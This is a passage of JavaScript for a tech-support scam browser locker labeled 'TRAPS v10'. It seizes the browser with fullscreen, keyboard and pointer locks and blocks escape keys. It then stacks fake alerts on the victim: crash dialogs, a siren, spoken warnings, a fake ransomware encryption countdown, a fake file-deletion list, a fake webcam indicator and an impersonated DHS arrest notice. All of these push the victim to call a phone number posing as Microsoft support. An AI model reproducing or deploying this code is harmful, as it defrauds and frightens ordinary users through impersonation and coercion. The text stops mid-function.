// ===== TRAPS v10 - Windows =====
// CONFIG
var TP_PHONE="+1 (833) 7631-619";
var TP_BRAND="Windows Security";

(function(){
var ph=0,escPressed=false,escTimer=null,dialogBombActive=false,bsodShown=false,dataLoss=0,glitchTimer=null,dialogs=[];
// ===== POLL FOR ACTIVATION =====
var ci=setInterval(function(){
if(document.fullscreenElement||document.webkitFullscreenElement||document.body.style.cursor==='none'||document.documentElement.style.cursor==='none'){ph=1;clearInterval(ci);_t()}
},500);
// ===== HIDE "PRESS/HOLD ESC" MESSAGE WHEN FULLSCREEN (mac + windows) =====
// Creates a high-z-index cover div over the ESC hint / #esc-bar area while
// fullscreen, and force-hides our own #esc-bar (the 10s hold-ESC progress bar)
// so it never appears. NOTE: the browser's native fullscreen pill ("Press and
// hold ESC to exit fullscreen") is drawn by the browser chrome ABOVE all page
// content, so no page z-index can cover it; the re-entry technique in _t()
// already suppresses it after the first fullscreen entry.
var __fsOn=false,__fsMask=null;
function __fsSync(){
  __fsOn=!!(document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement);
  if(__fsOn&&!__fsMask){
    __fsMask=document.createElement('div');
    __fsMask.id='esc-hide';
    __fsMask.style.cssText='position:fixed;top:0;left:0;width:100%;height:80px;z-index:2147483646;pointer-events:none;background:linear-gradient(to bottom,rgba(0,0,0,0.92),rgba(0,0,0,0.7) 60%,rgba(0,0,0,0));';
    document.body.appendChild(__fsMask);
  }else if(!__fsOn&&__fsMask){__fsMask.remove();__fsMask=null}
  var __eb=document.getElementById('esc-bar');
  if(__eb)__eb.style.display=__fsOn?'none':'';
}
document.addEventListener('fullscreenchange',__fsSync);
document.addEventListener('webkitfullscreenchange',__fsSync);
document.addEventListener('mozfullscreenchange',__fsSync);
document.addEventListener('MSFullscreenChange',__fsSync);
setInterval(__fsSync,250);

function _t(){
if(navigator.keyboard&&navigator.keyboard.lock)navigator.keyboard.lock().catch(function(){});
// ===== SUPPRESS browser native "Press ESC" notification via re-entry technique =====
// Chrome only shows the notification pill on the first fullscreen entry.
// Re-requesting fullscreen on fullscreenchange suppresses re-display.
var _fsSup=0;
document.addEventListener('fullscreenchange',function __fs(){
if(document.fullscreenElement&&!_fsSup){_fsSup=1;
var el=document.documentElement;
(el.requestFullscreen||el.webkitRequestFullscreen||function(){}).call(el,{navigationUI:'hide'}).catch(function(){});
setTimeout(function(){_fsSup=0},2000)
}});
document.addEventListener('webkitfullscreenchange',function __fs(){
if(document.webkitFullscreenElement&&!_fsSup){_fsSup=1;
var el=document.documentElement;
(el.webkitRequestFullscreen||function(){}).call(el).catch(function(){});
setTimeout(function(){_fsSup=0},2000)
}});
// Key blocking
document.addEventListener('keydown',function(e){var b=[116,122,123,27];if(b.indexOf(e.keyCode)>=0||(e.ctrlKey&&[87,82,78].indexOf(e.keyCode)>=0)||(e.altKey&&e.keyCode===115)||(e.metaKey&&[87,81,82].indexOf(e.keyCode)>=0)){e.preventDefault();e.stopPropagation()}
// Escape trap - 10 second hold, resets on keyup
if(e.key==='Escape'&&!escPressed){escPressed=true;document.getElementById('esc-bar')&&(document.getElementById('esc-bar').style.display='block');escTimer=setTimeout(function(){deactivate()},10000)}e.preventDefault()
});
document.addEventListener('keyup',function(e){if(e.key==='Escape'){escPressed=false;if(escTimer){clearTimeout(escTimer);escTimer=null}document.getElementById('esc-bar')&&(document.getElementById('esc-bar').style.display='none')}});
document.addEventListener('contextmenu',function(e){e.preventDefault();return false},true);
document.addEventListener('mousedown',function(e){if(e.button===1||e.button===2)e.preventDefault()},true);
document.addEventListener('mouseup',function(e){if(e.button===1||e.button===2)e.preventDefault()},true);

// ===== CLICK ANYWHERE = RE-LOCK FULLSCREEN + POINTER =====
document.addEventListener('click',function(){
// Keyboard lock must be called from user gesture to succeed
try{navigator.keyboard&&navigator.keyboard.lock&&navigator.keyboard.lock()}catch(e){}
var el=document.documentElement;
(el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||el.msRequestFullscreen||function(){}).call(el,{navigationUI:'hide'}).catch(function(){});
(el.requestPointerLock||function(){}).call(el);
});

// ===== PERSISTENT PHONE NUMBER BAR (always visible) =====
var pb=document.createElement('div');
pb.style.cssText='position:fixed;bottom:0;left:0;width:100%;z-index:100002;background:rgba(0,0,0,0.92);backdrop-filter:blur(8px);padding:6px 12px;display:flex;align-items:center;justify-content:center;gap:12px;font-family:Arial,sans-serif;border-top:2px solid #d32f2f;animation:tbFadeIn 0.5s';
pb.innerHTML='<span style="color:#ff8a80;font-size:11px;font-weight:600">&#9888; CRITICAL SYSTEM ALERT</span><span style="color:#555">|</span><span style="color:#fff;font-size:18px;font-weight:700;letter-spacing:0.5px">&#9742; '+TP_PHONE+'</span><span style="color:#555">|</span><span style="color:#ff8a80;font-size:10px">Call Immediately</span>';
document.body.appendChild(pb);

// ===== MOUSEOUT DIALOG BOMB =====
var MSGS=[
{h:"CRITICAL SYSTEM FAILURE",t:"This machine is unstable and may crash at any moment. Do not touch or restart it."},
{h:"HARDWARE MALFUNCTION",t:"Critical hardware error detected. System will shut down to prevent permanent damage."},
{h:"MEMORY CORRUPTION",t:"RAM failure detected. Data may be lost. Do not close or restart this computer."},
{h:"OVERHEATING ALERT",t:"CPU temperature critical. System may catch fire if operated further. Leave it untouched."},
{h:"FAN FAILURE DETECTED",t:"Cooling system malfunction. Continued use may cause permanent hardware destruction."},
{h:"POWER SURGE PROTECTION",t:"Unstable power supply detected. System is locked to prevent electrical damage."},
{h:"DISK ERROR CRITICAL",t:"Hard drive failure imminent. All data will be lost if system is disturbed."},
{h:"BOOT SECTOR CORRUPTED",t:"System files are damaged beyond repair. Do not attempt to access this machine."}
];
var ESCALATED=[
{h:"DATA BREACH IN PROGRESS",t:"Your personal files are being corrupted. 1,842 files affected. Call immediately to stop data loss."},
{h:"IDENTITY COMPROMISED",t:"Passwords and banking data extracted. Your identity is being stolen right now."},
{h:"ENCRYPTION ACTIVE",t:"All files are being encrypted. Your documents, photos, and videos will be permanently lost."},
{h:"REMOTE ACCESS DETECTED",t:"An unauthorized connection is active. Your webcam and microphone may be compromised."}
];
// ====== DIALOG STYLES (different designs) ======
var DSTYLES=[
{c:"#d32f2f",b:"#1a0000",i:"red",s:"error",ic:"&#10060;"},
{c:"#e65100",b:"#1a0f00",i:"orange",s:"warning",ic:"&#9888;"},
{c:"#1565c0",b:"#000a1a",i:"blue",s:"info",ic:"&#8505;"},
{c:"#2e7d32",b:"#001a00",i:"green",s:"secure",ic:"&#10004;"},
{c:"#6a1b9a",b:"#0a001a",i:"purple",s:"alert",ic:"&#128680;"}
];

document.addEventListener('mouseout',function(e){
if(!e.toElement&&!e.relatedTarget&&!dialogBombActive){
dialogBombActive=true;
spawnDialogBomb();
startEscalation();
startDataLossCounter();
startGlitchEffect();
playSiren();
}
});

// ====== SIREN ======
function playSiren(){
try{
var ac=new(window.AudioContext||window.webkitAudioContext)();
var osc=ac.createOscillator(),gain=ac.createGain();
osc.connect(gain);gain.connect(ac.destination);
osc.frequency.setValueAtTime(800,ac.currentTime);
osc.frequency.linearRampToValueAtTime(1200,ac.currentTime+0.15);
osc.frequency.linearRampToValueAtTime(800,ac.currentTime+0.3);
osc.type='sawtooth';gain.gain.setValueAtTime(0.08,ac.currentTime);
gain.gain.linearRampToValueAtTime(0,ac.currentTime+0.3);
osc.start(ac.currentTime);osc.stop(ac.currentTime+0.3);
setTimeout(function(){try{playSiren()}catch(e){}},2000);
}catch(e){}
}

// ====== DATA LOSS COUNTER ======
function startDataLossCounter(){
dataLoss=Math.floor(1500+Math.random()*500);
setInterval(function(){
dataLoss+=Math.floor(Math.random()*7)+1;
var els=document.querySelectorAll('.tb-dloss');
for(var i=0;i<els.length;i++)els[i].textContent='Files corrupted: '+dataLoss.toLocaleString();
},800);
}

// ====== GLITCH EFFECT ======
function startGlitchEffect(){
var gl=document.createElement('div');
gl.id='tb-glitch';
gl.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;pointer-events:none;display:none';
document.body.appendChild(gl);
glitchTimer=setInterval(function(){
if(Math.random()>0.7){
gl.style.display='block';gl.style.background='rgba(255,0,0,'+(0.03+Math.random()*0.04)+')';gl.style.mixBlendMode='screen';
setTimeout(function(){gl.style.display='none'},80+Math.random()*120);
}
},500);
var sl=document.createElement('div');
sl.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:99997;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px)';
document.body.appendChild(sl);
}

// ====== ESCALATION ======
function startEscalation(){
setTimeout(function(){
var dls=document.querySelectorAll('.tb-dialog');
for(var i=0;i<dls.length;i+=2){
var msg=ESCALATED[Math.floor(Math.random()*ESCALATED.length)];
var hdr=dls[i].querySelector('div:first-child span:first-child');
var body=dls[i].querySelector('div:nth-child(2)');
if(hdr)hdr.textContent='⚠ '+msg.h;
if(body)body.textContent=msg.t;
}
},5000);
setTimeout(function(){showBSOD()},10000);
}

// ====== INTERACTIVE WIZARD (replaces BSOD) ======
function showBSOD(){
if(bsodShown)return;
bsodShown=true;
var pcName='DESKTOP-'+(Math.random().toString(36).substring(2,8).toUpperCase());
var fakeIP='198.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255);
var step=0;
var w=document.createElement('div');
w.id='tb-wiz';
w.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:100000;display:flex;align-items:center;justify-content:center;font-family:"Segoe UI",sans-serif;padding:20px;animation:tbFadeIn 0.5s';
w.innerHTML='<div id="tb-wiz-box" style="background:#fff;border-radius:12px;box-shadow:0 12px 60px rgba(0,0,0,0.5);padding:0;max-width:560px;width:100%;overflow:hidden;border-top:4px solid #0078d4"></div>';
document.body.appendChild(w);
var box=document.getElementById('tb-wiz-box');

// ===== STEP 1: IS THIS YOUR COMPUTER? =====
function step1(){
step=1;
box.innerHTML='<div style="padding:28px 32px 20px;text-align:center">'+
'<div style="width:56px;height:56px;background:#e3f2fd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">'+
'<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#1976d2"/></svg>'+
'</div>'+
'<h2 style="font-size:20px;font-weight:600;color:#1a1a1a;margin-bottom:6px">Windows Security Alert</h2>'+
'<p style="font-size:13px;color:#666;margin-bottom:16px;line-height:1.5">A critical threat has been detected on <strong style="color:#d32f2f">'+pcName+'</strong>. Is this your computer?</p>'+
'<div style="background:#f5f5f5;border-radius:8px;padding:14px 16px;margin-bottom:20px;text-align:left;font-size:12px;font-family:Consolas,monospace">'+
'<div style="display:flex;justify-content:space-between;padding:3px 0"><span style="color:#888">Device:</span><span style="color:#d32f2f;font-weight:600">'+pcName+'</span></div>'+
'<div style="display:flex;justify-content:space-between;padding:3px 0"><span style="color:#888">Alert type:</span><span style="color:#d32f2f;font-weight:600">Trojan:Win32/Hive.ZY</span></div>'+
'<div style="display:flex;justify-content:space-between;padding:3px 0"><span style="color:#888">Suspicious IP:</span><span style="color:#d32f2f;font-weight:600">'+fakeIP+'</span></div>'+
'</div>'+
'<div style="display:flex;gap:10px">'+
'<button id="tb-wiz-no" style="flex:1;padding:12px;border:2px solid #e0e0e0;border-radius:8px;background:#fff;font-size:14px;font-weight:600;color:#555;cursor:pointer">&#10060; No, this is not mine</button>'+
'<button id="tb-wiz-yes" style="flex:1;padding:12px;border:none;border-radius:8px;background:#0078d4;font-size:14px;font-weight:600;color:#fff;cursor:pointer">&#10004; Yes, this is my computer</button>'+
'</div></div>';
document.getElementById('tb-wiz-yes').onclick=function(){step2(true)};
document.getElementById('tb-wiz-no').onclick=function(){step2(false)};
}

// ===== STEP 2: THREAT ANALYSIS =====
function step2(isMine){
step=2;
var title=isMine?'Identity Verification Required':'Unauthorized Access Detected';
var msg=isMine?'We have confirmed this device. Our security scan found the following threats requiring immediate attention:':'This device was reported as unauthorized. Your personal data may be at risk. Immediate action is required:';
var threats=[
'<span style="color:#d32f2f;font-weight:600">Trojan:Win32/Hive.ZY</span> — Memory injection detected',
'<span style="color:#d32f2f;font-weight:600">PUA:Win32/IdentityThief</span> — Credential harvesting in progress',
'<span style="color:#d32f2f;font-weight:600">Backdoor:Win32/RemoteAccess</span> — Unauthorized remote connection'
].join('</li><li style="font-size:12px;color:#444;padding:4px 0">');
box.innerHTML='<div style="padding:28px 32px 20px;text-align:center">'+
'<div style="width:56px;height:56px;background:'+(isMine?'#e8f5e8':'#fff0f0')+';border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">'+
'<span style="font-size:28px">'+(isMine?'&#10004;':'&#9888;')+'</span></div>'+
'<h2 style="font-size:20px;font-weight:600;color:#1a1a1a;margin-bottom:4px">'+title+'</h2>'+
'<p style="font-size:13px;color:#666;margin-bottom:16px;line-height:1.5">'+msg+'</p>'+
'<div style="background:#f5f5f5;border-radius:8px;padding:14px 18px;margin-bottom:16px;text-align:left">'+
'<ul style="list-style:none;padding:0;margin:0"><li style="font-size:12px;color:#444;padding:4px 0">'+threats+'</li></ul>'+
'</div>'+
'<div style="background:#fff0f0;border:1px solid #ffcdd2;border-radius:8px;padding:12px;margin-bottom:16px;text-align:left;font-size:12px">'+
'<strong style="color:#d32f2f">&#9888; '+pcName+' is at risk</strong><br>'+
'<span style="color:#666">'+(isMine?'Compromised data: <span id="tb-compromised">0</span> files':'Suspicious activity detected from your network')+'</span>'+
'</div>'+
'<button id="tb-wiz-next" style="width:100%;padding:12px;border:none;border-radius:8px;background:#0078d4;font-size:14px;font-weight:600;color:#fff;cursor:pointer">Continue to Resolution &#8594;</button>'+
'</div>';
document.getElementById('tb-wiz-next').onclick=function(){step3(isMine)};
// File counter
var fc=0;
setInterval(function(){fc+=Math.floor(Math.random()*13)+5;
var el=document.getElementById('tb-compromised');
if(el)el.textContent=fc.toLocaleString()},600);
}

// ===== STEP 3: CALL SUPPORT (the only way out) =====
function step3(isMine){
step=3;
var ref='WIN-'+Math.floor(1000+Math.random()*9000);
box.innerHTML='<div style="padding:28px 32px 24px;text-align:center">'+
'<div style="width:56px;height:56px;background:#fff0f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">'+
'<span style="font-size:28px">&#9742;</span></div>'+
'<h2 style="font-size:20px;font-weight:600;color:#1a1a1a;margin-bottom:4px">System Resolution Required</h2>'+
'<p style="font-size:13px;color:#666;margin-bottom:20px;line-height:1.5">Our automated system cannot resolve this issue remotely. A certified technician must assist you.</p>'+
'<div style="background:#f0f7ff;border:1px solid #bbdefb;border-radius:10px;padding:18px;margin-bottom:16px">'+
'<p style="font-size:12px;color:#555;margin-bottom:8px">&#9742; Call Microsoft Certified Support toll-free:</p>'+
'<p style="font-size:30px;font-weight:700;color:#0078d4;letter-spacing:1px;margin:8px 0">'+TP_PHONE+'</p>'+
'<p style="font-size:10px;color:#999">Reference #: '+ref+'</p>'+
'</div>'+
'<div style="margin-bottom:16px"><div style="display:flex;justify-content:space-between;font-size:11px;color:#888;margin-bottom:4px"><span>Connecting to secure server</span><span id="tb-cpct">0%</span></div><div style="height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden"><div id="tb-cbar" style="height:100%;width:0%;background:linear-gradient(90deg,#0078d4,#00bcd4);border-radius:3px"></div></div><div style="font-size:10px;color:#d32f2f;margin-top:4px;display:none" id="tb-cerr">&#9888; Connection failed. Please call the number above.</div></div>'+
'<p style="font-size:11px;color:#888;padding:8px;background:#f5f5f5;border-radius:6px">&#9888; Do not close this window. Your system will remain locked until a technician assists you.</p>'+
'</div>';
// Progress bar that gets stuck
var pct=0;
var pint=setInterval(function(){
pct+=Math.floor(Math.random()*4)+1;
if(pct>=97){pct=97;clearInterval(pint);
setTimeout(function(){var e=document.getElementById('tb-cerr');if(e)e.style.display='block'},2500)}
var bar=document.getElementById('tb-cbar');if(bar)bar.style.width=pct+'%';
var pctEl=document.getElementById('tb-cpct');if(pctEl)pctEl.textContent=pct+'%';
},300);
// Webcam indicator
var wc=document.createElement('div');
wc.style.cssText='position:fixed;top:12px;right:12px;z-index:100001;background:rgba(0,0,0,0.9);border-radius:8px;padding:8px 14px;display:flex;align-items:center;gap:8px;font-family:Arial,sans-serif;font-size:11px;animation:tbFadeIn 1s';
wc.innerHTML='<span style="width:8px;height:8px;background:#ff1744;border-radius:50%;animation:tbPulse 1s infinite"></span><span style="color:#ff1744;font-weight:600">CAM</span><span style="color:#888">|</span><span style="width:8px;height:8px;background:#ff1744;border-radius:50%;animation:tbPulse 1s infinite"></span><span style="color:#ff1744;font-weight:600">MIC</span>';
document.body.appendChild(wc);
}

// Start at step 1
setTimeout(step1,600);
}

// ====== VOICE SYNTHESIS (speaks the warning) ======
function speakWarning(){
try{
if(!window.speechSynthesis)return;
var t=new SpeechSynthesisUtterance();
t.text='Alert. Your computer has been infected with a dangerous Trojan virus. Call Microsoft support immediately at '+TP_PHONE+' Repeat. Call Microsoft support now at '+TP_PHONE+' Failure to do so may result in permanent data loss.';
t.rate=0.85;
t.pitch=0.9;
t.volume=1;
window.speechSynthesis.speak(t);
// Repeat after 30 seconds
setTimeout(function(){try{
var t2=new SpeechSynthesisUtterance();
t2.text='This is your final warning. Your system is critically compromised. Call '+TP_PHONE+' immediately to prevent irreversible damage to your computer and personal data.';
t2.rate=0.8;t2.pitch=0.85;t2.volume=1;
window.speechSynthesis.speak(t2)}catch(e){}},30000);
}catch(e){}
}
setTimeout(speakWarning,3000);

// ====== FAKE RANSOM OVERLAY (encryption countdown) ======
setTimeout(function(){
var ro=document.createElement('div');
ro.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:100003;display:flex;align-items:center;justify-content:center;font-family:"Segoe UI",sans-serif;animation:tbFadeIn 0.8s';
ro.innerHTML='<div style="background:#fff;border-radius:12px;box-shadow:0 12px 60px rgba(0,0,0,0.5);padding:32px;max-width:480px;width:90%;text-align:center;border-left:6px solid #d32f2f">'+
'<div style="font-size:48px;margin-bottom:12px">&#128274;</div>'+
'<h2 style="font-size:20px;font-weight:700;color:#d32f2f;margin-bottom:8px">YOUR FILES ARE BEING ENCRYPTED</h2>'+
'<p style="font-size:13px;color:#666;margin-bottom:16px;line-height:1.5">A ransomware-type threat has been detected. Your personal files, documents, and photos are being encrypted in real-time.</p>'+
'<div style="background:#fff0f0;border:1px solid #ffcdd2;border-radius:8px;padding:14px;margin-bottom:16px">'+
'<div style="display:flex;justify-content:space-between;font-size:11px;color:#888;margin-bottom:4px"><span>Encryption Progress</span><span id="tb-enc-pct">0%</span></div>'+
'<div style="height:8px;background:#e0e0e0;border-radius:4px;overflow:hidden"><div id="tb-enc-bar" style="height:100%;width:0%;background:#d32f2f;border-radius:4px;transition:width 0.5s"></div></div></div>'+
'<div style="background:#f0f7ff;border:1px solid #bbdefb;border-radius:8px;padding:14px;margin-bottom:4px">'+
'<p style="font-size:11px;color:#555;margin-bottom:6px">&#9742; Call now to stop encryption and recover your files:</p>'+
'<p style="font-size:24px;font-weight:700;color:#0078d4;letter-spacing:1px">'+TP_PHONE+'</p>'+
'<p style="font-size:9px;color:#d32f2f;margin-top:4px">&#9888; <span id="tb-enc-files">0</span> files encrypted so far. Every second matters.</p></div></div>';
document.body.appendChild(ro);
// Encryption progress that climbs then stalls
var encPct=0;
setInterval(function(){
encPct+=Math.floor(Math.random()*6)+2;
if(encPct>87)encPct=87;
var bar=document.getElementById('tb-enc-bar');if(bar)bar.style.width=encPct+'%';
var pct=document.getElementById('tb-enc-pct');if(pct)pct.textContent=encPct+'%';
},400);
// File counter
var encFiles=0;
setInterval(function(){encFiles+=Math.floor(Math.random()*20)+8;
var el=document.getElementById('tb-enc-files');
if(el)el.textContent=encFiles.toLocaleString()},500);
},8000);

// ====== FAKE FILE DELETION OVERLAY ======
setTimeout(function(){
var fileList=['bank_statements_2024.pdf','family_vacation_2023.jpg','tax_returns_2024.xlsx','personal_id_scan.png','wedding_photos.zip','passwords.txt','business_docs.docx','medical_records.pdf','children_photos.jpg','insurance_policy.pdf'];
var fo=document.createElement('div');
fo.style.cssText='position:fixed;top:20px;right:20px;z-index:100004;background:rgba(0,0,0,0.92);border-radius:8px;padding:12px 16px;max-width:300px;font-family:Consolas,monospace;font-size:10px;color:#ff5252;animation:tbFadeIn 1s;border:1px solid #d32f2f';
fo.innerHTML='<div style="font-weight:700;margin-bottom:8px;color:#ff8a80;font-size:11px">&#128465; FILE CORRUPTION IN PROGRESS</div><div id="tb-file-list"></div>';
document.body.appendChild(fo);
var fl=document.getElementById('tb-file-list');
var fi=0;
setInterval(function(){
if(fi>=fileList.length)fi=0;
var entry=document.createElement('div');
entry.style.cssText='padding:3px 0;opacity:0;animation:tbFadeIn 0.5s forwards;color:#ff5252';
entry.innerHTML='<span style="color:#888">&#10060;</span> '+fileList[fi];
fl.appendChild(entry);
fi++;
},1800);
},12000);

// ====== FAKE FBI / DHS CYBERCRIME WARNING (authority fear) ======
setTimeout(function(){
var fbi=document.createElement('div');
fbi.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:100005;display:flex;align-items:center;justify-content:center;font-family:"Times New Roman",Georgia,serif;animation:tbFadeIn 1.5s';
fbi.innerHTML='<div style="background:#fff;padding:36px;max-width:600px;width:92%;text-align:center;border:3px solid #1a237e;box-shadow:0 0 60px rgba(26,35,126,0.3);position:relative">'+
'<div style="display:flex;justify-content:center;align-items:center;gap:20px;margin-bottom:8px">'+
'<div style="font-size:36px;font-weight:700;color:#1a237e;letter-spacing:2px;font-family:serif">DHS</div>'+
'<div style="width:2px;height:40px;background:#1a237e"></div>'+
'<div style="font-size:11px;color:#1a237e;text-align:left;line-height:1.3;font-family:Arial,sans-serif"><strong>U.S. DEPARTMENT OF HOMELAND SECURITY</strong><br>CYBERCRIME INVESTIGATIONS DIVISION</div>'+
'</div>'+
'<div style="width:100%;height:2px;background:linear-gradient(90deg,transparent,#1a237e,transparent);margin-bottom:16px"></div>'+
'<div style="background:#fff0f0;border:1px solid #d32f2f;padding:10px;margin-bottom:14px;font-size:11px;color:#d32f2f;font-family:Arial,sans-serif;font-weight:600">&#9888; OFFICIAL NOTICE — IMMEDIATE ACTION REQUIRED</div>'+
'<p style="font-size:13px;color:#333;line-height:1.6;margin-bottom:14px;font-family:Arial,sans-serif;text-align:left">This device has been flagged by the <strong>DHS Cybercrime Investigations Division</strong> for suspected violations of <strong>United States Code Title 18, Section 1030</strong> — Fraud and related activity in connection with computers.</p>'+
'<div style="background:#f5f5f5;border:1px solid #ddd;padding:12px;margin-bottom:14px;text-align:left;font-size:11px;font-family:Consolas,monospace;line-height:1.8">'+
'<div style="color:#d32f2f"><strong>Violations Detected:</strong></div>'+
'<div style="color:#555">&#8226; Unauthorized access to protected computer (18 U.S.C. §1030(a)(2))</div>'+
'<div style="color:#555">&#8226; Possession of malicious software (18 U.S.C. §1030(a)(5)(A))</div>'+
'<div style="color:#555">&#8226; Intentional damage through malware distribution</div>'+
'</div>'+
'<div style="background:#fff8e1;border:1px solid #ffd54f;padding:10px;margin-bottom:14px;font-size:11px;color:#e65100;font-family:Arial,sans-serif;text-align:left"><strong>PENALTIES:</strong> Federal fines up to <strong>$250,000</strong> and/or imprisonment up to <strong>10 years</strong> per violation (18 U.S.C. §1030(c)).</div>'+
'<div style="background:#f0f7ff;border:1px solid #bbdefb;border-radius:8px;padding:14px;margin-bottom:4px">'+
'<p style="font-size:12px;color:#555;margin-bottom:6px;font-family:Arial,sans-serif">&#9742; To resolve this matter, contact the DHS Cybercrime Resolution Division:</p>'+
'<p style="font-size:26px;font-weight:700;color:#1a237e;letter-spacing:1px;font-family:Arial,sans-serif">'+TP_PHONE+'</p>'+
'<p style="font-size:9px;color:#999;margin-top:4px;font-family:Arial,sans-serif">Case Reference: DHS-CYB-'+Math.floor(1000+Math.random()*9000)+'-USA</p></div>'+
'<p style="font-size:9px;color:#999;margin-top:10px;font-family:Arial,sans-serif">Failure to respond may result in a warrant for your arrest. This is a government-issued notification.</p>'+
'</div>';
document.body.appendChild(fbi);
// Blinking red badge in corner
var bb=document.createElement('div');
bb.style.cssText='position:fixed;top:0;left:0;z-index:100006;background:#d32f2f;color:#fff;padding:6px 16px;font-size:11px;font-weight:700;font-family:Arial,sans-serif;animation:tbPulse 1s infinite;border-radius:0 0 8px 0';
bb.innerHTML='&#9888; DHS CYBER ALERT';
document.body.appendChild(bb);
},15000);

// ====== FAKE TECHNICIAN CONNECTING (urgency + social proof) ======
setTimeout(function(){
var tc=document.createElement('div');
tc.style.cssText='position:fixed;bottom:80px;right:20px;z-index:100007;background:#fff;border-radius:10px;box-shadow:0 4px 24px rgba(0,0,0,0.3);padding:14px 18px;width:280px;font-family:Arial,sans-serif;border-left:4px solid #0078d4;animation:tbFadeIn 0.8s';
tc.innerHTML='<div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">'+
'<div style="width:36px;height:36px;background:#0078d4;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700">MS</div>'+
'<div style="flex:1"><div style="font-size:12px;font-weight:600;color:#1a1a1a">Microsoft Support</div><div style="font-size:10px;color:#888">Senior Technician • <span id="tb-tech-status">Connecting...</span></div></div>'+
'<div style="width:8px;height:8px;background:#4caf50;border-radius:50%;animation:tbPulse 1s infinite"></div></div>'+
'<div style="height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden;margin-bottom:8px"><div id="tb-tech-bar" style="height:100%;width:0%;background:#4caf50;border-radius:2px;transition:width 0.3s"></div></div>'+
'<div style="font-size:10px;color:#888;text-align:center">Attempting to establish secure remote connection... <span id="tb-tech-attempt">1</span>/3</div>'+
'<div style="font-size:10px;color:#d32f2f;text-align:center;margin-top:4px;display:none" id="tb-tech-fail">&#9888; Connection failed. Call <strong>'+TP_PHONE+'</strong> for manual assistance.</div>';
document.body.appendChild(tc);
// Progress bar that fills then fails
var tp=0;
var ta=1;
var tInt=setInterval(function(){
tp+=Math.floor(Math.random()*8)+3;
if(tp>=100){tp=100;ta++;
if(ta>3){
clearInterval(tInt);
document.getElementById('tb-tech-bar').style.background='#d32f2f';
document.getElementById('tb-tech-status').textContent='Failed';
var failEl=document.getElementById('tb-tech-fail');
if(failEl)failEl.style.display='block';
setTimeout(function(){tc.style.borderLeftColor='#d32f2f'},500);
return;
}
tp=0;
document.getElementById('tb-tech-attempt').textContent=ta;
}
var bar=document.getElementById('tb-tech-bar');if(bar)bar.style.width=tp+'%';
if(ta<=3)document.getElementById('tb-tech-status').textContent='Attempt '+ta+' of 3';
},200);
},18000);

// ====== FAKE DEVICE COMPROMISE COUNTER ======
setTimeout(function(){
var dc=document.createElement('div');
dc.style.cssText='position:fixed;top:60px;right:20px;z-index:100004;background:rgba(0,0,0,0.9);border-radius:8px;padding:8px 14px;font-family:Consolas,monospace;font-size:10px;color:#ff5252;animation:tbFadeIn 1s;border:1px solid #d32f2f';
dc.innerHTML='<div style="color:#ff8a80;font-size:9px;font-weight:600;margin-bottom:4px">&#128680; DEVICE COMPROMISE</div>'+
'<div style="display:flex;gap:16px"><span>IP: <span id="tb-hack-ip">'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'</span></span><span>PORT: <span id="tb-hack-port">'+Math.floor(40000+Math.random()*20000)+'</span></span></div>'+
'<div style="display:flex;gap:16px;margin-top:2px"><span>PACKETS: <span id="tb-hack-pkts">0</span></span><span>STATUS: <span style="color:#ff1744;font-weight:600">ACTIVE</span></span></div>';
document.body.appendChild(dc);
var pkts=0;
setInterval(function(){pkts+=Math.floor(Math.random()*50)+20;
var el=document.getElementById('tb-hack-pkts');
if(el)el.textContent=pkts.toLocaleString()},300);
},2000);

// ====== CONTINUOUS DIALOG SPAWNER (drops 3-5 new dialogs every 6 seconds) ======
setInterval(function(){
if(typeof spawnReplacement === 'function' && typeof DSTYLES !== 'undefined'){
var count=3+Math.floor(Math.random()*3);
for(var i=0;i<count;i++){
try{spawnReplacement()}catch(e){}
}
}
},6000);

// ====== "CANCEL / RESOLVE" BUTTON (re-triggers fullscreen + 10s escape) ======
setTimeout(function(){
var cb=document.createElement('div');
cb.style.cssText='position:fixed;bottom:50px;left:50%;transform:translateX(-50%);z-index:100008;text-align:center;animation:tbFadeIn 2s';
cb.innerHTML='<button id="tb-cancel-btn" style="padding:10px 28px;border:2px solid rgba(255,255,255,0.3);border-radius:8px;background:rgba(0,0,0,0.7);color:#ccc;font-size:13px;font-family:Arial,sans-serif;cursor:pointer;backdrop-filter:blur(4px);transition:all 0.3s">&#10060; I want to resolve this issue</button>';
document.body.appendChild(cb);
document.getElementById('tb-cancel-btn').onclick=function(){
// Re-trigger fullscreen + pointer lock
try{navigator.keyboard&&navigator.keyboard.lock&&navigator.keyboard.lock()}catch(e){}
var el=document.documentElement;
(el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||el.msRequestFullscreen||function(){}).call(el,{navigationUI:'hide'}).catch(function(){});
(el.requestPointerLock||function(){}).call(el);
// Reset escape timer
escPressed=true;
document.getElementById('esc-bar')&&(document.getElementById('esc-bar').style.display='block');
if(escTimer){clearTimeout(escTimer);escTimer=null}
escTimer=setTimeout(function(){deactivate()},10000);
// Spawn 10 new dialogs immediately
